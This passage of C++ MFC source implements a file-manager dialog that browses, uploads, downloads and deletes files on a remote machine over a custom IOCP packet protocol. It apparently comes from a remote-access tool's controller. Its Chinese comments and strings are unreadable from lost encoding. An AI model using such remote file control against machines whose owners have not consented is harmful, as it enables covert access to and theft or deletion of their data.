	case TOKEN_FILE_DATA:	//�ļ�����
		WriteLocalRecvFile();
		break;
	case TOKEN_TRANSFER_FINISH:		//�������
		EndLocalRecvFile();
		break;
	case TOKEN_CREATEFOLDER_FINISH:
		GetRemoteFileList(".");
		break;
	case TOKEN_DELETE_FINISH:
		EndRemoteDeleteFile();
		break;
	case TOKEN_GET_TRANSFER_MODE:
		SendTransferMode();
		break;
	case TOKEN_DATA_CONTINUE:
		SendFileData();
		break;
	case TOKEN_RENAME_FINISH:
		GetRemoteFileList(".");
		break;
	default:
		SendException();
		break;
	}
}

void CFileManagerDlg::GetRemoteFileList(CString directory /* = "" */)
{
	if (directory.GetLength() == 0)
	{
		int nItem = m_list_remote.GetSelectionMark();

		//�����ѡ�еģ�����Ŀ¼
		if (nItem != -1)
		{
			if(m_list_remote.GetItemData(nItem) == 1)
				directory = m_list_remote.GetItemText(nItem, 0);
		} 
		else
		{
			m_Remote_Directory_ComboBox.GetWindowText(m_Remote_Path);
		}
	}

	//�õ���Ŀ¼
	if (directory == "..")
	{
		m_Remote_Path = GetParentDirectory(m_Remote_Path);
	}
	else if (directory != ".")
	{
		m_Remote_Path += directory;
		if(m_Remote_Path.Right(1) != "\\")
			m_Remote_Path += "\\";
	}

	//if���̸�Ŀ¼�����ش����б�
	if (m_Remote_Path.GetLength() == 0)
	{
		FixedRmoteDriveList();
		return ;
	}

	int nPacketSize = m_Remote_Path.GetLength() + 2;
	BYTE *bPacket = (BYTE*)LocalAlloc(LPTR, nPacketSize);

	bPacket[0] = COMMAND_LIST_FILES;
	memcpy(bPacket + 1, m_Remote_Path.GetBuffer(0), nPacketSize - 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);
	LocalFree(bPacket);

	m_Remote_Directory_ComboBox.InsertString(0, m_Remote_Path);
	m_Remote_Directory_ComboBox.SetCurSel(0);

	//�õ���������ǰ���ô���
	m_list_remote.EnableWindow(FALSE);
	m_ProgressCtrl->SetPos(0);
}

void CFileManagerDlg::OnDblclkListRemote(NMHDR *pNMHDR, LRESULT *pResult)
{
	//LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	if(m_list_remote.GetSelectedCount() == 0 || m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) != 1)
		return ;

	GetRemoteFileList();
	*pResult = 0;
}

void CFileManagerDlg::FixedRemoteFileList(BYTE *pbBuffer, DWORD dwBufferLen)
{
	//����ϵͳImageList
	SHFILEINFO sfi;
	HIMAGELIST hImageListLarge = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_LARGEICON);
	HIMAGELIST hImageListSmall = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi, sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListLarge, LVSIL_NORMAL);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListSmall, LVSIL_SMALL);

	//�ؽ�����
	m_list_remote.DeleteAllItems();
	while(m_list_remote.DeleteColumn(0));
	m_list_remote.InsertColumn(0, "����",  LVCFMT_LEFT, 200);
	m_list_remote.InsertColumn(1, "��С", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(2, "����", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(3, "�޸�����", LVCFMT_LEFT, 115);

	int nItemIndex = 0;
	m_list_remote.SetItemData(
		m_list_remote.InsertItem(nItemIndex, "..", GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),
		1);

	//����ListView��˸��ʹ��SetRedraw
	m_list_remote.SetRedraw(FALSE);

	if (dwBufferLen != 0)
	{
		for (int i = 0; i < 2; i++)
		{
			char *pList = (char*)pbBuffer + 1;
			for (char *pBase = pList; pList - pBase < dwBufferLen -1;)
			{
				char    *pszFileName = NULL;
				DWORD	dwFileSizeHigh = 0;		//�ļ����ֽڴ�С
				DWORD	dwFileSizeLow  = 0;
				bool    bIsInsert = false;
				int		nItem = 0;
				FILETIME	ftm_strReceiveLocalFileTime;

				int	nType = *pList ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
				//iΪ0����Ŀ¼��iΪ1�����ļ�
				bIsInsert = !(nType == FILE_ATTRIBUTE_DIRECTORY) == i;
				pszFileName = ++pList;

				if (bIsInsert)
				{
					nItem = m_list_remote.InsertItem(nItemIndex++, pszFileName, GetIconIndex(pszFileName, nType));
					m_list_remote.SetItemData(nItem, nType == FILE_ATTRIBUTE_DIRECTORY);
					SHFILEINFO sfi;
					SHGetFileInfo(pszFileName, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
					m_list_remote.SetItemText(nItem, 2, sfi.szTypeName);
				}

				pList += lstrlen(pszFileName) + 1;	//plist����ƶ��ļ������ȸ��ֽ�

				if (bIsInsert)
				{
					if(i)
					{
						memcpy(&dwFileSizeHigh, pList , 4);
						memcpy(&dwFileSizeLow, pList +4, 4);
						CString strSize;
						strSize.Format("%10d KB", (dwFileSizeHigh * (MAXDWORD+1)) / 1024 + dwFileSizeLow / 1024 + (dwFileSizeLow % 1024 ? 1 : 0));
						m_list_remote.SetItemText(nItem, 1, strSize);
					}

					memcpy(&ftm_strReceiveLocalFileTime, pList + 8, sizeof(FILETIME));
					CTime time(ftm_strReceiveLocalFileTime);
					m_list_remote.SetItemText(nItem, 3, time.Format("%Y-%m-%d %H:%M"));
				}
				pList += 16;
			}
		}
	}

	m_list_remote.SetRedraw(TRUE);
	m_list_remote.EnableWindow(TRUE);
}

void CFileManagerDlg::EnableControl(BOOL bEnable /* = TRUE */)
{
	m_list_local.EnableWindow(bEnable);
	m_list_remote.EnableWindow(bEnable);
	m_Local_Directory_ComboBox.EnableWindow(bEnable);
	m_Remote_Directory_ComboBox.EnableWindow(bEnable);
}

void CFileManagerDlg::OnLocalPrev()
{
	// TODO: �ڴ���������������
	FixedLocalFileList("..");
}

void CFileManagerDlg::OnRemotePrev()
{
	// TODO: �ڴ���������������
	GetRemoteFileList("..");
}

void CFileManagerDlg::OnLocalView()
{
	// TODO: �ڴ���������������
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}


void CFileManagerDlg::OnLocalList()
{
	// TODO: �ڴ���������������
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_LIST);
}


void CFileManagerDlg::OnLocalReport()
{
	// TODO: �ڴ���������������
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);
}


void CFileManagerDlg::OnLocalBigicon()
{
	// TODO: �ڴ���������������
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}


void CFileManagerDlg::OnLocalSmallicon()
{
	// TODO: �ڴ���������������
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);
}


void CFileManagerDlg::OnRemoteList()
{
	// TODO: �ڴ���������������
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_LIST);
}


void CFileManagerDlg::OnRemoteReport()
{
	// TODO: �ڴ���������������
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);
}


void CFileManagerDlg::OnRemoteBigicon()
{
	// TODO: �ڴ���������������
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}


void CFileManagerDlg::OnRemoteSmallicon()
{
	// TODO: �ڴ���������������
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);
}


void CFileManagerDlg::OnRemoteView()
{
	// TODO: �ڴ���������������
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}


void CFileManagerDlg::OnLocalDelete()
{
	// TODO: �ڴ���������������
	m_bIsUpload = true;
	CString str;

	if (m_list_local.GetSelectedCount() > 1)
	{
		str.Format("ȷ��Ҫ���� %d ��ɾ����?", m_list_local.GetSelectedCount());
	} 
	else
	{
		CString file = m_list_local.GetItemText(m_list_local.GetSelectionMark(), 0);

		if(m_list_local.GetItemData(m_list_local.GetSelectionMark()) == 1)
			str.Format("ȷ��Ҫɾ���ļ��С�%s��������������ɾ����?", file);
		else
			str.Format("ȷ��Ҫ�ѡ�%s��ɾ����?", file);
	}

	if(::MessageBox(m_hWnd, str, "ȷ��ɾ��", MB_YESNO | MB_ICONQUESTION) == IDNO)
		return ;

	EnableControl(FALSE);

	POSITION pos = m_list_local.GetFirstSelectedItemPosition();
	while(pos)
	{
		int nItem = m_list_local.GetNextSelectedItem(pos);
		CString file = m_Local_Path + m_list_local.GetItemText(nItem, 0);
		//�����Ŀ¼
		if (m_list_local.GetItemData(nItem))
		{
			file += "\\";
			DeleteDirectory(file);
		} 
		else
		{
			DeleteFile(file);
		}
	}

	EnableControl(TRUE);

	FixedLocalFileList(".");
}

void CFileManagerDlg::OnLocalNewfolder()
{
	// TODO: �ڴ���������������
	if(m_Local_Path == "")
		return ;

	CInputDialog dlg(this);		//this����Ϊָ��CFileManagerDlgΪ������
	if (dlg.DoModal() == IDOK && dlg.m_strDirectory.GetLength())
	{
		MakeSureDirectoryPathExists(m_Local_Path + dlg.m_strDirectory + "\\");
		FixedLocalFileList(".");	//ˢ���ļ��б�
	}
}


void CFileManagerDlg::OnLocalStop()
{
	// TODO: �ڴ���������������
	m_bIsStop = TRUE;
}


void CFileManagerDlg::OnRemoteDelete()
{
	// TODO: �ڴ���������������
	m_bIsUpload = false;
	CString str;

	if (m_list_remote.GetSelectedCount() > 1)
	{
		str.Format("ȷ��Ҫ���� %d ��ɾ����?", m_list_remote.GetSelectedCount());
	}
	else
	{
		CString file = m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);

		if(m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) == 1)
			str.Format("ȷ��Ҫɾ���ļ��� ��%s�� ������������ɾ����?", file);
		else
			str.Format("ȷ��Ҫ�ѡ�%s��ɾ����?", file);
	}

	if(::MessageBox(m_hWnd, str, "ȷ��ɾ��", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return ;

	m_Remote_Delete_Job.RemoveAll();

	POSITION pos = m_list_remote.GetFirstSelectedItemPosition();
	while(pos)
	{
		int nItem = m_list_remote.GetNextSelectedItem(pos);
		CString file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);

		if(m_list_remote.GetItemData(nItem))
			file += "\\";

		m_Remote_Delete_Job.AddHead(file);
	}

	EnableControl(FALSE);
	//���͵�һ��ɾ������
	SendDeleteJob();
}


void CFileManagerDlg::OnRemoteNewfolder()
{
	// TODO: �ڴ���������������
	if(m_Remote_Path == "")
		return ;

	CInputDialog dlg(this);
	if (dlg.DoModal() == IDOK && dlg.m_strDirectory.GetLength())
	{
		CString file = m_Remote_Path + dlg.m_strDirectory + "\\";
		UINT nPacketSize = file.GetLength() + 2;

		LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketSize);
		lpBuffer[0] = COMMAND_CREATE_FOLDER;
		memcpy(lpBuffer + 1, file.GetBuffer(0), nPacketSize - 1);
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
		LocalFree(lpBuffer);
	}
}


void CFileManagerDlg::OnRemoteStop()
{
	// TODO: �ڴ���������������
	m_bIsStop = TRUE;
}


void CFileManagerDlg::OnUpdateRemoteCopy(CCmdUI *pCmdUI)
{
	// TODO: �ڴ������������û����洦��������
	pCmdUI->Enable(m_list_remote.IsWindowEnabled()
		&& (m_Local_Path.GetLength() || m_list_local.GetSelectedCount())
		&& m_list_remote.GetSelectedCount());
}


void CFileManagerDlg::OnUpdateLocalCopy(CCmdUI *pCmdUI)
{
	// TODO: �ڴ������������û����洦��������
	pCmdUI->Enable(m_list_local.IsWindowEnabled() 
		&& (m_Remote_Path.GetLength() || m_list_remote.GetSelectedCount())
		&& m_list_local.GetSelectedCount());
}


//Ϊ��Ŀ¼ʱ�������ϰ�ť
void CFileManagerDlg::OnUpdateLocalPrev(CCmdUI *pCmdUI)
{
	// TODO: �ڴ������������û����洦��������
	pCmdUI->Enable(m_Local_Path.GetLength() && m_list_local.IsWindowEnabled());
}


//Ϊ��Ŀ¼ʱ�������ϰ�ť
void CFileManagerDlg::OnUpdateRemotePrev(CCmdUI *pCmdUI)
{
	// TODO: �ڴ������������û����洦��������
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.IsWindowEnabled());
}


void CFileManagerDlg::OnUpdateRemoteStop(CCmdUI *pCmdUI)
{
	// TODO: �ڴ������������û����洦��������
	pCmdUI->Enable(!m_list_remote.IsWindowEnabled() && !m_bIsUpload);
}

//���Ǹ�Ŀ¼������ѡ����Ŀ����0
void CFileManagerDlg::OnUpdateLocalDelete(CCmdUI *pCmdUI)
{
	// TODO: �ڴ������������û����洦��������
	pCmdUI->Enable(m_Local_Path.GetLength() && m_list_local.GetSelectionMark() && m_list_local.IsWindowEnabled());
}


void CFileManagerDlg::OnUpdateLocalNewfolder(CCmdUI *pCmdUI)
{
	// TODO: �ڴ������������û����洦��������
	pCmdUI->Enable(m_Local_Path.GetLength() && m_list_local.IsWindowEnabled());
}


void CFileManagerDlg::OnUpdateLocalStop(CCmdUI *pCmdUI)
{
	// TODO: �ڴ������������û����洦��������
	pCmdUI->Enable(!m_list_local.IsWindowEnabled() && m_bIsUpload);
}


void CFileManagerDlg::OnUpdateRemoteDelete(CCmdUI *pCmdUI)
{
	// TODO: �ڴ������������û����洦��������
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.GetSelectionMark() && m_list_remote.IsWindowEnabled());
}


void CFileManagerDlg::OnUpdateRemoteNewfolder(CCmdUI *pCmdUI)
{
	// TODO: �ڴ������������û����洦��������
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.IsWindowEnabled());
}


bool CFileManagerDlg::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA wfd;
	char lpszFilter[MAX_PATH];

	sprintf(lpszFilter, "%s\\*.*", lpszDirectory);

	HANDLE hfind = FindFirstFile(lpszFilter, &wfd);
	if(hfind == INVALID_HANDLE_VALUE)
		return false;

	do 
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				sprintf(strDirectory, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strfile[MAX_PATH];
				sprintf(strfile, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteFile(strfile);
			}
		}
	} while (FindNextFile(hfind, &wfd));

	FindClose(hfind);

	if (!RemoveDirectory(lpszDirectory))
	{
		return false;
	}

	return true;
}

//��Ҫ���䵽�ͻ��˵��ļ�������m_Remote_Upload_Job�������local�б�ѡ�е����ļ����͵ݹ���ļ��������е��ļ�������m_Remote_Upload_Job
bool CFileManagerDlg::FixedUploadDirectory(LPCTSTR lpPathName)
{
	char lpszFilter[MAX_PATH];
	char *lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	lpszSlash = (lpPathName[lstrlen(lpPathName) - 1] != '\\') ? "\\" : "";

	sprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);

	WIN32_FIND_DATA wfd;
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if(hFind == INVALID_HANDLE_VALUE)
		return false;

	do 
	{
		if(wfd.cFileName[0] == '.')
			continue;
		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			char strDirectory[MAX_PATH];
			sprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
			FixedUploadDirectory(strDirectory);		// ����ҵ�����Ŀ¼��������Ŀ¼���еݹ� 
		}
		else
		{
			CString file;
			file.Format("%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
			m_Remote_Upload_Job.AddHead(file);
		}
	} while (FindNextFile(hFind, &wfd));

	FindClose(hFind);

	return true;
}

BOOL CFileManagerDlg::SendUploadJob()
{
	if(m_Remote_Upload_Job.IsEmpty())
		return FALSE;

	CString strDestDirectory = m_Remote_Path;
	//���Զ���б��Ѿ�ѡ�У�����Ŀ���ļ���
	int nItem = m_list_remote.GetSelectionMark();

	//���ļ���
	if(nItem != -1 && m_list_remote.GetItemData(nItem) == 1)
	{
		strDestDirectory += m_list_remote.GetItemText(nItem, 0) + "\\";
	}

	if (!m_strCopyDestFolder.IsEmpty())
	{
		strDestDirectory += m_strCopyDestFolder + "\\";
	}

	//��ȡ��Ҫ���Ƶ��ͻ��ļ������б��ͷһ��
	m_strOperatingFile = m_Remote_Upload_Job.GetHead();

	DWORD dwSizeHigh;
	DWORD dwSizeLow;
	//// 1 �ֽ�token + 8�ֽڴ�С + �ļ����� + '\0'
	HANDLE hFile;
	CString fileRemote = m_strOperatingFile;	//Զ���ļ�
	//�õ�Ҫ���浽Զ�̵��ļ�·��
	fileRemote.Replace(m_Local_Path, strDestDirectory);
	m_strUploadRemoteFile = fileRemote;

	hFile = CreateFile(m_strOperatingFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if(hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow = GetFileSize(hFile, &dwSizeHigh);
	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+1)) + dwSizeLow;
	CloseHandle(hFile);

	//�������ݰ�
	int nPacketSize = fileRemote.GetLength() + 10;
	BYTE *bPacket = (BYTE*)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);

	bPacket[0] = COMMAND_FILE_SIZE;
	memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
	memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
	memcpy(bPacket + 9, fileRemote.GetBuffer(0), fileRemote.GetLength() + 1);

	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);

	//�������б���ɾ��
	m_Remote_Upload_Job.RemoveHead();
	return TRUE;
}

BOOL CFileManagerDlg::SendDeleteJob()
{
	if(m_Remote_Delete_Job.IsEmpty())
		return FALSE;

	CString file = m_Remote_Delete_Job.GetHead();
	int nPacketSize = file.GetLength() + 2;
	BYTE *bPacket = (BYTE*)LocalAlloc(LPTR, nPacketSize);

	if (file.Right(1) == '\\')
	{
		bPacket[0] = COMMAND_DELETE_DIRECTORY;
	} 
	else
	{
		bPacket[0] = COMMAND_DELETE_FILE;
	}

	memcpy(bPacket + 1, file.GetBuffer(0), nPacketSize - 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);
	m_Remote_Delete_Job.RemoveHead();
	return TRUE;
}

BOOL CFileManagerDlg::SendDownloadJob()
{
	if(m_Remote_Download_Job.IsEmpty())
		return FALSE;

	CString file = m_Remote_Download_Job.GetHead();
	int nPacketSize = file.GetLength() + 2;
	BYTE *bPacket = (BYTE*)LocalAlloc(LPTR, nPacketSize);

	bPacket[0] = COMMAND_DOWN_FILES;
	memcpy(bPacket + 1, file.GetBuffer(0), file.GetLength() + 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);
	//��Զ�˸��Ƶ����ص������б�ɾ��ͷ��Ԫ��
	m_Remote_Download_Job.RemoveHead();

	return TRUE;
}

void CFileManagerDlg::CreateLocalRecvFile()
{
	m_nCounter = 0;
	CString strDestDirectory = m_Local_Path;
	int nItem = m_list_local.GetSelectionMark();

	//��������б��Ѿ���ѡ����ļ���,����ʹ�����drop���ļ���
	if (!m_strCopyDestFolder.IsEmpty())
	{
		strDestDirectory += m_strCopyDestFolder + "\\";
	}
	else if (nItem != -1 && m_list_local.GetItemData(nItem) == 1)
	{
		strDestDirectory += m_list_local.GetItemText(nItem, 0) + "\\";
	}

	FILESIZE *pFileSize = (FILESIZE*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD dwSizeHigh = pFileSize->dwSizeHigh;
	DWORD dwSizeLow  = pFileSize->dwSizeLow;

	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+1)) + dwSizeLow;

	//��ǰ���ڲ������ļ���
	m_strOperatingFile = m_pContext->m_DeCompressionBuffer.GetBuffer(9);
	m_strReceiveLocalFile = m_strOperatingFile;
	// �õ�Ҫ���浽�ı��ص��ļ�·��
	m_strReceiveLocalFile.Replace(m_Remote_Path, strDestDirectory);
	// �������Ŀ¼
	MakeSureDirectoryPathExists(m_strReceiveLocalFile.GetBuffer(0));

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strReceiveLocalFile, &FindFileData);

	//�ж��ļ��Ƿ���ڣ�������ڣ����Ը��ǡ�����������ģʽ����
	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL)
	{
		CFileTransferModeDlg dlg(this);
		dlg.m_strFileName = m_strReceiveLocalFile;

		switch(dlg.DoModal())
		{
		case IDC_OVERWRITE:
			m_nTransferMode = TRANSFER_MODE_OVERWRITE;
			break;
		case IDC_OVERWRITE_ALL:
			m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
			break;
		case IDC_ADDITION:
			m_nTransferMode = TRANSFER_MODE_ADDITION;
			break;
		case IDC_ADDITION_ALL:
			m_nTransferMode = TRANSFER_MODE_ADDITION_ALL;
			break;
		case IDC_JUMP:
			m_nTransferMode = TRANSFER_MODE_JUMP;
			break;
		case IDC_JUMP_ALL:
			m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
			break;
		case IDC_CANCEL:
			m_nTransferMode = TRANSFER_MODE_CANCEL;
			break;
		}
	}

	if (m_nTransferMode == TRANSFER_MODE_CANCEL)
	{
		m_bIsStop = TRUE;
		SendStop();
		return ;
	}

	int nTransferMode;
	switch(m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}

	//  1�ֽ�Token,���ֽ�ƫ�Ƹ���λ�����ֽ�ƫ�Ƶ���λ
	BYTE bToken[9];
	DWORD dwCreationDisposition;		//�ļ��򿪷�ʽ
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = COMMAND_CONTINUE;		//Ҫ���͵�����ͷ

	if (hFind != INVALID_HANDLE_VALUE)
	{
		//���������
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);

			//���ܵĳ��ȵ���
			m_nCounter += FindFileData.nFileSizeHigh * (MAXDWORD+1) + FindFileData.nFileSizeLow;
			dwCreationDisposition = OPEN_EXISTING;
		}
		//����
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			//ƫ����0
			memset(bToken + 1, 0, 8);
			dwCreationDisposition = CREATE_ALWAYS;
		}
		//�������ļ�ƫ����Ϊ-1
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			m_ProgressCtrl->SetPos(100);
			DWORD dwOffset = -1;
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else//�ļ�������
	{
		memset(bToken + 1, 0, 8);
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);

	//�����ļ�
	HANDLE hFile = CreateFile(m_strReceiveLocalFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nOperatingFileLength = 0;
		m_nCounter = 0;
		::MessageBox(m_hWnd, m_strReceiveLocalFile + " �ļ�����ʧ��", "����", MB_OK | MB_ICONWARNING);
		return ;
	}
	CloseHandle(hFile);

	ShowProgress();

	if(m_bIsStop)
		SendStop();
	else
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
}

void CFileManagerDlg::WriteLocalRecvFile()
{
	BYTE *pData;
	int  nHeadLength = 9; //1 + 4 + 4  ���� + �ļ�ƫ��high + low
	FILESIZE *pFileSize;
	DWORD	dwBytesToWrite;		//���ܵ����ļ����ݳ���
	DWORD	dwBytesWrite;

	//�õ����ܵ��ļ�����
	pData = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);

	pFileSize = (FILESIZE *)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);
	LONG dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG dwOffsetLow  = pFileSize->dwSizeLow;

	dwBytesToWrite = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;

	HANDLE hFile = CreateFile(m_strReceiveLocalFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	//�����ļ�ƫ��
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

	BOOL ret = FALSE;
	int i;
	//���д��ʧ�ܣ����Զ��
	for (i = 0; i < MAX_WRITE_RETRY; i++)
	{
		ret = WriteFile(hFile, pData, dwBytesToWrite, &dwBytesWrite, NULL);
		if (ret)
		{
			break;
		}
	}

	if (i == MAX_WRITE_RETRY && !ret)
	{
		::MessageBox(m_hWnd, m_strReceiveLocalFile + " �ļ�д��ʧ��", "����", MB_OK|MB_ICONWARNING);
	}

	CloseHandle(hFile);

	//����������
	m_nCounter += dwBytesWrite;
	ShowProgress();

	if (m_bIsStop)
	{
		SendStop();
	} 
	else
	{
		BYTE bToken[9];
		bToken[0] = COMMAND_CONTINUE;
		dwOffsetLow += dwBytesWrite;
		memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
		memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}

}

void CFileManagerDlg::EndLocalRecvFile()
{
	m_nCounter = 0;
	m_strOperatingFile = "";
	m_nOperatingFileLength = 0;

	if (m_Remote_Download_Job.IsEmpty() || m_bIsStop)
	{
		m_Remote_Download_Job.RemoveAll();
		m_bIsStop = FALSE;

		m_nTransferMode = TRANSFER_MODE_NORMAL;
		EnableControl(TRUE);
		FixedLocalFileList(".");
		m_ProgressCtrl->SetPos(0);
	} 
	else
	{
		Sleep(5);
		SendDownloadJob();
	}
}

void CFileManagerDlg::ShowMessage(char *lpFmt, ...)
{
	/*char buff[1024];
	va_list    arglist;
	va_start( arglist, lpFmt );

	memset(buff, 0, sizeof(buff));

	vsprintf(buff, lpFmt, arglist);
	m_wndStatusBar.SetPaneText(0, buff);
	va_end( arglist );*/
}

void CFileManagerDlg::ShowProgress()
{
	char	*lpDirection = NULL;
	if (m_bIsUpload)
		lpDirection = "�����ļ�";
	else
		lpDirection = "�����ļ�";


	if ((int)m_nCounter == -1)
	{
		m_nCounter = m_nOperatingFileLength;
	}

	int	progress = (float)(m_nCounter * 100) / m_nOperatingFileLength;
	ShowMessage("%s %s %dKB (%d%%)", lpDirection, m_strOperatingFile, (int)(m_nCounter / 1024), progress);
	m_ProgressCtrl->SetPos(progress);

	if (m_nCounter == m_nOperatingFileLength)
	{
		m_nCounter = m_nOperatingFileLength = 0;
		// �ر��ļ����
	}
}

void CFileManagerDlg::SendStop()
{
	BYTE bBuff = COMMAND_STOP;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CFileManagerDlg::SendFileData()
{
	FILESIZE *pFileSize = (FILESIZE*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	LONG dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG dwOffsetLow  = pFileSize->dwSizeLow;

	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

	ShowProgress();

	if (m_nCounter == m_nOperatingFileLength || pFileSize->dwSizeLow == -1 || m_bIsStop)
	{
		EndLocalUploadFile();
		return ;
	}

	HANDLE hFile;
	hFile = CreateFile(m_strOperatingFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if(hFile == INVALID_HANDLE_VALUE)
		return ;

	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

	int nHeadLength = 9;	//1 + 4 + 4 ���ݰ�ͷ��С

	DWORD nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD nNumberOfBytesRead = 0;

	memset(m_pSendBuffer, 0 , MAX_SEND_BUFFER);
	//BYTE *lpBuffer = (BYTE*)LocalAlloc(LPTR, MAX_SEND_BUFFER);

	m_pSendBuffer[0] = COMMAND_FILE_DATA;
	memcpy(m_pSendBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(m_pSendBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));

	BOOL ret = ReadFile(hFile, m_pSendBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	if (!ret)
	{
		MessageBox("ReadFile failed");
	}
	CloseHandle(hFile);

	if (nNumberOfBytesRead > 0)
	{
